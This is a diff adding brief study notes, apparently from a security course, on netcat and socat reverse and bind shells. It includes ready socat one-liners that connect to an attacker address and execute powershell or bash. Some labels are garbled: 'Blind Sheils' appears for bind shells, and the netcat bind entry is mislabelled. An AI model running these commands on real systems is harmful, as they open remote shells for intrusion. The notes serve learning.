@@ -1,0 +1,25 @@
+Netcat - connect to remote ports, networking tool. 
+
+Reverse Shells : ( listener on the attacker machine )
+Nc -lvnp 443
+-l is used to tell netcat that this will be a listener
+-v is used to request a verbose output
+-n tells netcat not to resolve host names or use DNS. 
+-p indicates that the port specification will follow.
+
+
+Blind Sheils : ( listener on target machine )
+Nc <target IP> port
+
+
+
+SoCat - connector between two points, like listening port and a file
+
+Reverse Shells :
+Windows base : socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes ( pipes = convert to linux )
+Linux base : socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+Bind Shells :
+Windows base : socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+Linux base : socat TCP-L:<PORT> EXEC:"bash -li"
+Running on the attacker to start convo - socat TCP:<TARGET-IP>:<TARGET-PORT> -
